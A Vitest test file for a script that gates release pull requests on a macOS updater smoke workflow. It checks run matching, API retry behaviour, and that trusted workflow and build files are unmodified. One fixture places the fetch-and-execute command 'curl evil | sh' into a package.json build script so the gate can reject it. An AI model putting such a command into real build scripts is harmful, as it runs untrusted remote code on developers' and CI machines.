import { readFileSync } from "node:fs";
import { type Mock, describe, expect, it, vi } from "vitest";
import {
  assertSmokeWorkflowUnmodified,
  evaluateSmokeRun,
  findMatchingSmokeRuns,
  smokeRunTitle,
  smokeTrustedPaths,
  waitForMacosSmoke,
} from "../scripts/wait-for-release-pr-macos-smoke.mjs";

const successfulRun = {
  id: 123,
  event: "pull_request",
  head_sha: "release-sha",
  head_branch: "release/2026.11.0",
  display_title:
    "macOS updater bundle smoke | PR #42 | head release-sha | base base-sha",
  status: "completed",
  conclusion: "success",
  html_url: "https://github.com/owner/repo/actions/runs/123",
  created_at: "2026-11-02T00:00:00Z",
  run_number: 1,
};

const successfulJobs = [
  {
    name: "Build x86_64-apple-darwin",
    status: "completed",
    conclusion: "success",
  },
  {
    name: "Build aarch64-apple-darwin",
    status: "completed",
    conclusion: "success",
  },
];

function response(payload: object): Response {
  return new Response(JSON.stringify(payload), { status: 200 });
}

const trustedRequests = smokeTrustedPaths.length * 2;

/** Contents-API body for a JSON file; the sha changes with the content, as it does in git. */
function encodedJson(value: object): object {
  const content = JSON.stringify(value);
  return {
    sha: `sha-${content}`,
    encoding: "base64",
    content: Buffer.from(content).toString("base64"),
  };
}

/** Answers every trusted-path lookup in order, using `changes` for paths whose base and head differ. */
function trustedContentsFetch(
  changes: Record<string, [object, object]>,
): Mock<typeof fetch> {
  const fetchImpl = vi.fn<typeof fetch>();
  for (const path of smokeTrustedPaths) {
    const [base, head] = changes[path] ?? [
      { sha: `same-${path}` },
      { sha: `same-${path}` },
    ];
    fetchImpl
      .mockResolvedValueOnce(response(base))
      .mockResolvedValueOnce(response(head));
  }
  return fetchImpl;
}

/** Queues the trusted-input SHA lookups (base and head for each trusted path) that run before polling. */
function queueTrustedInputs(fetchImpl: Mock<typeof fetch>): Mock<typeof fetch> {
  for (let index = 0; index < trustedRequests; index += 1) {
    fetchImpl.mockResolvedValueOnce(response({ sha: "workflow-sha" }));
  }
  return fetchImpl;
}

describe("release PR macOS updater smoke gate", () => {
  it("keeps the run title format in sync with the smoke workflow run-name", () => {
    const workflow = readFileSync(
      new URL("../.github/workflows/macos-updater-bundle-smoke.yml", import.meta.url),
      "utf8",
    );
    const template = workflow.match(
      /format\('macOS updater bundle smoke \| PR #\{0\} \| head \{1\} \| base \{2\}'/,
    );
    expect(template).not.toBeNull();

    const args = workflow.match(
      /format\('macOS updater bundle smoke[^']*',\s*([^)]*)\)/,
    );
    expect(args?.[1]?.split(",").map((arg) => arg.trim())).toEqual([
      "github.event.pull_request.number",
      "github.event.pull_request.head.sha",
      "github.event.pull_request.base.sha",
    ]);

    const fromWorkflow = template?.[0]
      .replace("format('", "")
      .replace(/'$/, "")
      .replace("{0}", "42")
      .replace("{1}", "release-sha")
      .replace("{2}", "base-sha");
    expect(fromWorkflow).toBe(smokeRunTitle(42, "release-sha", "base-sha"));
  });

  it("matches the workflow run to the exact PR, head, branch, and base", async () => {
    const fetchImpl = vi.fn<typeof fetch>().mockResolvedValue(
      response({
        workflow_runs: [
          successfulRun,
          { ...successfulRun, id: 122, head_sha: "old-sha" },
          {
            ...successfulRun,
            id: 121,
            display_title:
              "macOS updater bundle smoke | PR #41 | head release-sha | base base-sha",
          },
          {
            ...successfulRun,
            id: 120,
            display_title:
              "macOS updater bundle smoke | PR #42 | head release-sha | base old-base",
          },
        ],
      }),
    );

    const runs = await findMatchingSmokeRuns({
      apiBaseUrl: "https://api.github.com",
      owner: "owner",
      repo: "repo",
      pullRequestNumber: 42,
      headSha: "release-sha",
      headRef: "release/2026.11.0",
      baseSha: "base-sha",
      token: "test-token",
      fetchImpl,
    });

    expect(runs).toEqual([successfulRun]);
    expect(fetchImpl.mock.calls[0][0]).toContain(
      "head_sha=release-sha&event=pull_request",
    );
  });

  it("ignores skipped runs created by title or body edits", async () => {
    const fetchImpl = vi.fn<typeof fetch>().mockResolvedValue(
      response({
        workflow_runs: [
          { ...successfulRun, id: 130, conclusion: "skipped", run_number: 2 },
          successfulRun,
        ],
      }),
    );

    const runs = await findMatchingSmokeRuns({
      apiBaseUrl: "https://api.github.com",
      owner: "owner",
      repo: "repo",
      pullRequestNumber: 42,
      headSha: "release-sha",
      headRef: "release/2026.11.0",
      baseSha: "base-sha",
      token: "test-token",
      fetchImpl,
    });

    expect(runs).toEqual([successfulRun]);
  });

  it("rejects a smoke workflow modified by the pull request", async () => {
    const fetchImpl = vi
      .fn<typeof fetch>()
      .mockResolvedValueOnce(response({ sha: "base-workflow-sha" }))
      .mockResolvedValueOnce(response({ sha: "changed-workflow-sha" }));

    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl,
      }),
    ).rejects.toThrow(
      ".github/workflows/macos-updater-bundle-smoke.yml differs from the PR base",
    );
  });

  it("allows a release PR that changes only the version in package.json and tauri.conf.json", async () => {
    const changes = {
      "package.json": [
        encodedJson({ name: "epikrise", version: "2026.10.2" }),
        encodedJson({ name: "epikrise", version: "2026.11.0" }),
      ],
      "src-tauri/tauri.conf.json": [
        encodedJson({ productName: "Epikrise", version: "2026.10.2" }),
        encodedJson({ productName: "Epikrise", version: "2026.11.0" }),
      ],
    };

    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl: trustedContentsFetch(changes),
      }),
    ).resolves.toBeUndefined();
  });

  it("rejects a package.json change beyond the version", async () => {
    const changes = {
      "package.json": [
        encodedJson({ name: "epikrise", version: "2026.10.2", scripts: {} }),
        encodedJson({
          name: "epikrise",
          version: "2026.11.0",
          scripts: { build: "curl evil | sh" },
        }),
      ],
    };

    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl: trustedContentsFetch(changes),
      }),
    ).rejects.toThrow("package.json differs from the PR base");
  });

  it("rejects a trusted build script modified by the pull request", async () => {
    const fetchImpl = vi.fn<typeof fetch>();
    const changedIndex = smokeTrustedPaths.indexOf("scripts/prepare-ocr.sh");
    for (let index = 0; index < smokeTrustedPaths.length; index += 1) {
      const changed = index === changedIndex;
      fetchImpl
        .mockResolvedValueOnce(response({ sha: `base-${index}` }))
        .mockResolvedValueOnce(
          response({ sha: changed ? "changed-script-sha" : `base-${index}` }),
        );
    }

    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl,
      }),
    ).rejects.toThrow("scripts/prepare-ocr.sh differs from the PR base");
    expect(fetchImpl).toHaveBeenCalledTimes(
      (smokeTrustedPaths.indexOf("scripts/prepare-ocr.sh") + 1) * 2,
    );
  });

  it("passes only when both required smoke jobs succeed", () => {
    expect(evaluateSmokeRun(successfulRun, successfulJobs).state).toBe("passed");
    expect(
      evaluateSmokeRun(
        { ...successfulRun, status: "in_progress", conclusion: null },
        successfulJobs.slice(0, 1),
      ).state,
    ).toBe("pending");
  });

  it("fails when a required smoke job fails", () => {
    const jobs = [successfulJobs[0], { ...successfulJobs[1], conclusion: "failure" }];

    expect(evaluateSmokeRun(successfulRun, jobs)).toMatchObject({
      state: "failed",
      message: expect.stringContaining("Build aarch64-apple-darwin"),
    });
  });

  it("fails clearly when no matching smoke run appears before the deadline", async () => {
    const fetchImpl = queueTrustedInputs(vi.fn<typeof fetch>()).mockResolvedValueOnce(
      response({ workflow_runs: [] }),
    );

    await expect(
      waitForMacosSmoke({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        pullRequestNumber: 42,
        headSha: "release-sha",
        headRef: "release/2026.11.0",
        baseSha: "base-sha",
        token: "test-token",
        fetchImpl,
        now: () => 1_000,
        maxWaitMs: 0,
      }),
    ).rejects.toThrow("no matching smoke workflow run has appeared");
  });

  it("retries transient API errors before continuing to poll", async () => {
    const fetchImpl = queueTrustedInputs(vi.fn<typeof fetch>())
      .mockResolvedValueOnce(new Response("temporary failure", { status: 503 }))
      .mockResolvedValueOnce(response({ workflow_runs: [successfulRun] }))
      .mockResolvedValueOnce(response({ jobs: successfulJobs }));
    let elapsedMs = 0;

    await expect(
      waitForMacosSmoke({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        pullRequestNumber: 42,
        headSha: "release-sha",
        headRef: "release/2026.11.0",
        baseSha: "base-sha",
        token: "test-token",
        fetchImpl,
        now: () => elapsedMs,
        sleep: async (duration) => {
          elapsedMs += duration;
        },
        maxWaitMs: 5_000,
      }),
    ).resolves.toBeUndefined();
    expect(fetchImpl).toHaveBeenCalledTimes(trustedRequests + 3);
    expect(elapsedMs).toBe(1_000);
  });

  it("fails promptly for permanent API permission errors", async () => {
    const fetchImpl = queueTrustedInputs(vi.fn<typeof fetch>()).mockResolvedValueOnce(
      new Response('{"message":"Resource not accessible by integration"}', {
        status: 403,
      }),
    );

    await expect(
      waitForMacosSmoke({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        pullRequestNumber: 42,
        headSha: "release-sha",
        headRef: "release/2026.11.0",
        baseSha: "base-sha",
        token: "test-token",
        fetchImpl,
        now: () => 0,
        maxWaitMs: 5_000,
      }),
    ).rejects.toThrow("GitHub Actions API request failed (403)");
    expect(fetchImpl).toHaveBeenCalledTimes(trustedRequests + 1);
  });

  it("retries network failures reported by fetch", async () => {
    const fetchImpl = queueTrustedInputs(vi.fn<typeof fetch>())
      .mockRejectedValueOnce(
        new TypeError("fetch failed", { cause: new Error("ECONNRESET") }),
      )
      .mockResolvedValueOnce(response({ workflow_runs: [successfulRun] }))
      .mockResolvedValueOnce(response({ jobs: successfulJobs }));
    let elapsedMs = 0;

    await expect(
      waitForMacosSmoke({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        pullRequestNumber: 42,
        headSha: "release-sha",
        headRef: "release/2026.11.0",
        baseSha: "base-sha",
        token: "test-token",
        fetchImpl,
        now: () => elapsedMs,
        sleep: async (duration) => {
          elapsedMs += duration;
        },
        maxWaitMs: 5_000,
      }),
    ).resolves.toBeUndefined();
    expect(fetchImpl).toHaveBeenCalledTimes(trustedRequests + 3);
  });

  it("fails immediately on programming errors thrown as TypeError", async () => {
    const fetchImpl = queueTrustedInputs(vi.fn<typeof fetch>()).mockRejectedValueOnce(
      new TypeError("Cannot read properties of undefined"),
    );

    await expect(
      waitForMacosSmoke({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        pullRequestNumber: 42,
        headSha: "release-sha",
        headRef: "release/2026.11.0",
        baseSha: "base-sha",
        token: "test-token",
        fetchImpl,
        now: () => 0,
        maxWaitMs: 5_000,
      }),
    ).rejects.toThrow("Cannot read properties of undefined");
    expect(fetchImpl).toHaveBeenCalledTimes(trustedRequests + 1);
  });

  it("honors Retry-After when GitHub asks the gate to back off", async () => {
    const sleeps: number[] = [];
    const fetchImpl = queueTrustedInputs(vi.fn<typeof fetch>())
      .mockResolvedValueOnce(
        new Response("slow down", {
          status: 429,
          headers: { "Retry-After": "7" },
        }),
      )
      .mockResolvedValueOnce(response({ workflow_runs: [successfulRun] }))
      .mockResolvedValueOnce(response({ jobs: successfulJobs }));

    await waitForMacosSmoke({
      apiBaseUrl: "https://api.github.com",
      owner: "owner",
      repo: "repo",
      pullRequestNumber: 42,
      headSha: "release-sha",
      headRef: "release/2026.11.0",
      baseSha: "base-sha",
      token: "test-token",
      fetchImpl,
      now: () => 0,
      sleep: async (duration) => {
        sleeps.push(duration);
      },
      maxWaitMs: 60_000,
    });
    expect(sleeps).toEqual([7_000]);
  });

  it("retries a rate-limited 403 with the fallback backoff", async () => {
    const sleeps: number[] = [];
    const fetchImpl = queueTrustedInputs(vi.fn<typeof fetch>())
      .mockResolvedValueOnce(
        new Response("API rate limit exceeded", {
          status: 403,
          headers: { "x-ratelimit-remaining": "0" },
        }),
      )
      .mockResolvedValueOnce(response({ workflow_runs: [successfulRun] }))
      .mockResolvedValueOnce(response({ jobs: successfulJobs }));

    await waitForMacosSmoke({
      apiBaseUrl: "https://api.github.com",
      owner: "owner",
      repo: "repo",
      pullRequestNumber: 42,
      headSha: "release-sha",
      headRef: "release/2026.11.0",
      baseSha: "base-sha",
      token: "test-token",
      fetchImpl,
      now: () => 0,
      sleep: async (duration) => {
        sleeps.push(duration);
      },
      maxWaitMs: 60_000,
    });
    expect(sleeps).toEqual([1_000]);
    expect(fetchImpl).toHaveBeenCalledTimes(trustedRequests + 3);
  });

  it("ignores x-ratelimit-reset on a server error and uses the fallback backoff", async () => {
    const sleeps: number[] = [];
    const resetInFortyFiveMinutes = Math.floor(Date.now() / 1000) + 2_700;
    const fetchImpl = queueTrustedInputs(vi.fn<typeof fetch>())
      .mockResolvedValueOnce(
        new Response("bad gateway", {
          status: 502,
          headers: { "x-ratelimit-reset": String(resetInFortyFiveMinutes) },
        }),
      )
      .mockResolvedValueOnce(response({ workflow_runs: [successfulRun] }))
      .mockResolvedValueOnce(response({ jobs: successfulJobs }));

    await waitForMacosSmoke({
      apiBaseUrl: "https://api.github.com",
      owner: "owner",
      repo: "repo",
      pullRequestNumber: 42,
      headSha: "release-sha",
      headRef: "release/2026.11.0",
      baseSha: "base-sha",
      token: "test-token",
      fetchImpl,
      now: () => 0,
      sleep: async (duration) => {
        sleeps.push(duration);
      },
      maxWaitMs: 60_000,
    });
    expect(sleeps).toEqual([1_000]);
  });

  it("retries request timeouts reported as AbortError or TimeoutError", async () => {
    const fetchImpl = queueTrustedInputs(vi.fn<typeof fetch>())
      .mockRejectedValueOnce(
        Object.assign(new Error("The operation was aborted"), {
          name: "AbortError",
        }),
      )
      .mockRejectedValueOnce(
        Object.assign(new Error("The operation timed out"), {
          name: "TimeoutError",
        }),
      )
      .mockResolvedValueOnce(response({ workflow_runs: [successfulRun] }))
      .mockResolvedValueOnce(response({ jobs: successfulJobs }));
    const sleeps: number[] = [];

    await waitForMacosSmoke({
      apiBaseUrl: "https://api.github.com",
      owner: "owner",
      repo: "repo",
      pullRequestNumber: 42,
      headSha: "release-sha",
      headRef: "release/2026.11.0",
      baseSha: "base-sha",
      token: "test-token",
      fetchImpl,
      now: () => 0,
      sleep: async (duration) => {
        sleeps.push(duration);
      },
      maxWaitMs: 60_000,
    });
    expect(sleeps).toEqual([1_000, 2_000]);
    expect(fetchImpl).toHaveBeenCalledTimes(trustedRequests + 4);
  });

  it("times out with the transient cause when retries exhaust the deadline", async () => {
    const fetchImpl = queueTrustedInputs(vi.fn<typeof fetch>()).mockResolvedValueOnce(
      new Response("unavailable", { status: 503 }),
    );

    await expect(
      waitForMacosSmoke({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        pullRequestNumber: 42,
        headSha: "release-sha",
        headRef: "release/2026.11.0",
        baseSha: "base-sha",
        token: "test-token",
        fetchImpl,
        now: () => 1_000,
        maxWaitMs: 0,
      }),
    ).rejects.toThrow(
      "Timed out waiting for macOS updater bundle smoke results on release/2026.11.0 at release-sha after a transient GitHub API failure",
    );
  });

  it("names a base mismatch when the smoke run was built for an older base", async () => {
    const fetchImpl = queueTrustedInputs(vi.fn<typeof fetch>()).mockResolvedValueOnce(
      response({
        workflow_runs: [
          {
            ...successfulRun,
            display_title:
              "macOS updater bundle smoke | PR #42 | head release-sha | base old-base",
          },
        ],
      }),
    );

    await expect(
      waitForMacosSmoke({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        pullRequestNumber: 42,
        headSha: "release-sha",
        headRef: "release/2026.11.0",
        baseSha: "base-sha",
        token: "test-token",
        fetchImpl,
        now: () => 1_000,
        maxWaitMs: 0,
      }),
    ).rejects.toThrow("created for a different base");
  });

  it("keeps polling a pending run until both jobs pass", async () => {
    const sleeps: number[] = [];
    const pendingJobs = successfulJobs.map((job) => ({
      ...job,
      status: "in_progress",
      conclusion: null,
    }));
    const fetchImpl = queueTrustedInputs(vi.fn<typeof fetch>())
      .mockResolvedValueOnce(
        response({
          workflow_runs: [
            { ...successfulRun, status: "in_progress", conclusion: null },
          ],
        }),
      )
      .mockResolvedValueOnce(response({ jobs: pendingJobs }))
      .mockResolvedValueOnce(response({ workflow_runs: [successfulRun] }))
      .mockResolvedValueOnce(response({ jobs: successfulJobs }));

    await waitForMacosSmoke({
      apiBaseUrl: "https://api.github.com",
      owner: "owner",
      repo: "repo",
      pullRequestNumber: 42,
      headSha: "release-sha",
      headRef: "release/2026.11.0",
      baseSha: "base-sha",
      token: "test-token",
      fetchImpl,
      now: () => 0,
      sleep: async (duration) => {
        sleeps.push(duration);
      },
      maxWaitMs: 60_000,
      intervalMs: 30_000,
    });
    expect(sleeps).toEqual([30_000]);
    expect(fetchImpl).toHaveBeenCalledTimes(trustedRequests + 4);
  });

  it("skips a newer successful run whose required jobs were all skipped", async () => {
    const skippedJobs = successfulJobs.map((job) => ({
      ...job,
      conclusion: "skipped",
    }));
    const fetchImpl = queueTrustedInputs(vi.fn<typeof fetch>())
      .mockResolvedValueOnce(
        response({
          workflow_runs: [{ ...successfulRun, id: 130, run_number: 2 }, successfulRun],
        }),
      )
      .mockResolvedValueOnce(response({ jobs: skippedJobs }))
      .mockResolvedValueOnce(response({ jobs: successfulJobs }));

    await expect(
      waitForMacosSmoke({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        pullRequestNumber: 42,
        headSha: "release-sha",
        headRef: "release/2026.11.0",
        baseSha: "base-sha",
        token: "test-token",
        fetchImpl,
        now: () => 0,
        sleep: async () => {
          throw new Error("should not sleep");
        },
        maxWaitMs: 60_000,
        intervalMs: 30_000,
      }),
    ).resolves.toBeUndefined();
    expect(fetchImpl).toHaveBeenCalledTimes(trustedRequests + 3);
  });

  it("trusts every script reachable from the smoke workflow", () => {
    const repoRoot = new URL("../", import.meta.url);
    const scriptReference = /scripts\/[\w./-]+\.(?:sh|mjs)/g;
    const reached = new Set<string>();
    const pending = [".github/workflows/macos-updater-bundle-smoke.yml"];

    while (pending.length > 0) {
      const current = pending.pop() as string;
      if (reached.has(current)) {
        continue;
      }
      reached.add(current);
      const contents = readFileSync(new URL(current, repoRoot), "utf8");
      for (const [reference] of contents.matchAll(scriptReference)) {
        pending.push(reference);
      }
    }

    const untrusted = [...reached].filter((path) => !smokeTrustedPaths.includes(path));
    expect(untrusted).toEqual([]);
  });
});
